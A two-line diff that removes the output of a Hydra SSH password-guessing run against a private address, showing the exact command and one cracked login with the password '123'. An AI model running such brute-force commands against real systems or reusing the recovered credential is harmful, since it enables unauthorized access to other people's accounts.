@@ -1,2 +1,0 @@
-# Hydra v9.2 run at 2026-05-17 12:51:33 on 10.0.3.5 ssh (hydra -L users.txt -p 123 -t 4 -I -o hydra_123.txt ssh://10.0.3.5)
-[22][ssh] host: 10.0.3.5   login: nmacgarry   password: 123
